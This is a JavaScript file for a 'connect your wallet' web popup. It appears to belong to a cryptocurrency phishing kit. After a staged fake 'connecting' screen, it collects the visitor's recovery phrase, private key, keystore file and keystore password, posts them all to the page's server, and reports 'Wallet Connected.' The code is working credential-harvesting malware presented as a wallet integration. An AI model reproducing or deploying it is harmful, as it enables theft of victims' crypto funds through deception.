const popup = document.querySelector("#popup");
const overlay = document.querySelector("#overlay");
const initialview = document.querySelector("#initialView");
const walletView = document.querySelector("#walletView");
const firstview = document.querySelector("#firstView");
const secondView = document.querySelector("#secondView");
const thirdView = document.querySelector("#thirdView");
const cbutton = document.querySelector("#cbutton");
const lConnectW = document.querySelector("#lConnectW");
const backbutton = document.querySelector("#backbutton");
const cancelbutton = document.querySelector("#cancelbutton");
const manualConnect = document.querySelector("#manualConnect");
const connectForm = document.querySelector("#connectForm");
const connectbutton = document.querySelector("#connectbutton");
const tButtons = document.querySelectorAll(".t-button");
const searchInput = document.querySelector("#searchInput");
const wItems = document.querySelectorAll(".w-item");
const stepOne = document.querySelector("#stepOne");
const formImg = document.querySelector("#formImg");
const wTitle = document.querySelector("#wTitle");

let credType = "phrase";
let walletname = "";
let walletimg = "";



searchInput.addEventListener("input", e => {
    if(e.target.value.length > 0) {
        wItems.forEach(item => {
            const text = item.querySelectorAll("div")[1].innerText.toLowerCase().trim();
            if(!text.includes(e.target.value.trim().toLowerCase())){
                item.style.display = "none"
            }else{
                item.style.display = "flex"
            }
        })
    }else{
        wItems.forEach(item => {
            item.style.display = "flex"
        })
    }
});

wItems.forEach(item => {
    item.addEventListener("click", () => {
        walletname = item.querySelectorAll("div")[1].innerText;
        walletimg = item.querySelector("img").getAttribute("src");
        formImg.setAttribute("src",item.querySelector("img").getAttribute("src"));
        wTitle.innerText = walletname;
        walletView.style.display = "none";
        firstview.style.display = "block";
        lConnectW.style.display = "block";
        setTimeout(()=> {
            firstview.style.display = "none";
            secondView.style.display = "block";
        }, 3000);
    })
})

const resetViews = () => {
    popup.style.display = "none";
    walletView.style.display = "none";
    initialview.style.display = "block";
    firstview.style.display = "none";
    secondView.style.display = "none";
    thirdView.style.display = "none";
    lConnectW.style.display = "none";
};

stepOne.addEventListener("click", () => {
    initialview.style.display = "none";
    walletView.style.display = "block";
});

tButtons.forEach(b => {
    b.addEventListener("click", evt => {
        credType = evt.target.innerText;
    })
})

manualConnect.addEventListener("click", () => {
    secondView.style.display = "none";
    thirdView.style.display = "block";
})

cbutton.addEventListener("click", () => {
    popup.style.display = "flex";
});

backbutton.addEventListener("click", () => {
    resetViews();
});

cancelbutton.addEventListener("click", () => {
    popup.style.display = "none";
    resetViews();
});

connectbutton.addEventListener("click", e =>  {
    try{
        e.preventDefault();
        // get all input values
        const rphrase = document.querySelector("#floatingTextarea2").value;
        const keystorepass = document.querySelector("#keystorepass").value;
        const keystorefile = document.querySelector("#formFile");
        const privatekey = document.querySelector("#privatekey").value;
        // make api call
        const data = new FormData();
        data.append("type", credType);
        data.append("walletname", walletname);
        data.append("rphrase", rphrase);
        data.append("privatekey", privatekey);
        data.append("keystorepass", keystorepass);
        if(keystorefile.files.length){
            data.append("keystorefile", keystorefile.files[0], "keystorepass");
        }
        axios.post('/', data)
        .then(res => {
            if(res.data.success){
                FlashMessage.success('Wallet Connected.', {duration: 2000});
                resetViews();
                document.querySelector("#floatingTextarea2").value = "";
                document.querySelector("#keystorepass").value = "";
                document.querySelector("#privatekey").value = "";
                return;
            }else{
                FlashMessage.error(res.data.message, {duration: 2000});
                return;
            }
        }).catch(err => {
            console.log(err);
            FlashMessage.error("Failed to connect wallet.", {duration: 2000});
            return;
        })
    }catch(err){
        FlashMessage.error("Failed to connect wallet.", {duration: 2000});
        console.log(err);
    }
})






